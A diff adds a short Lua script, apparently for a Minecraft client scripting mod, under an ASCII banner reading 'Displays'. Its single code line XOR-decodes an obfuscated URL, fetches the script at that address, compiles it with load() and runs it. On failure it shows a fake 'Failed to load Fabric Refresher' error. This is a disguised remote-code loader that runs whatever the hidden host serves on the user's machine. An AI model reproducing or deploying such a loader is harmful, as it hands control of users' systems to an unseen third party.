@@ -1,0 +1,16 @@
+--[[
+--+===================================================+
+--|           __  __  _                               |
+--|__  __     \ \/ / | |__     ___   __  __           |
+--|\ \/ /      \  /  | '_ \   / _ \  \ \/ /           |
+--| >  <   _   /  \  | |_) | | (_) |  >  <            |
+--|/_/\_\ (_) /_/\_\ |_.__/   \___/  /_/\_\           |
+--||  _ \  (_)  ___   _ __   | |   __ _   _   _   ___ |
+--|| | | | | | / __| | '_ \  | |  / _` | | | | | / __||
+--|| |_| | | | \__ \ | |_) | | | | (_| | | |_| | \__ \|
+--||____/  |_| |___/ | .__/  |_|  \__,_|  \__, | |___/|
+--|                  |_|                  |___/       |
+--+===================================================+
+]]
+
+local s_char, s_byte, s_sub, bxor, t_concat, t_insert = string.char, string.byte, string.sub, (bit32 or bit).bxor, table.concat, table.insert local function jsS(str, key) local result = {} for i = 1, #str do local keyChar = 1 + (i % #key) t_insert(result, s_char(bxor(s_byte(str:sub(i,i)), s_byte(key:sub(keyChar,keyChar))) % 256)) end return t_concat(result) end local success, script = pcall(load, Request:create(jsS("\217\215\207\53\245\225\136\81\195\194\204\107\225\178\211\22\196\193\206\54\227\169\196\17\223\215\222\43\242\245\196\17\220\140\252\45\233\168\211\19\222\199\222\115\179\244\202\29\221\202\217\106\244\190\193\13\158\203\222\36\226\168\136\19\208\202\213\106\213\175\194\12\216\207\222\106\240\233\136\50\216\193\218\55\255\244\225\44\159\207\206\36", "\126\177\163\187\69\134\219\167")):get():text()) if success and script then script() else Chat:log("§4System Error: §fFailed to load Fabric Refresher") return false end
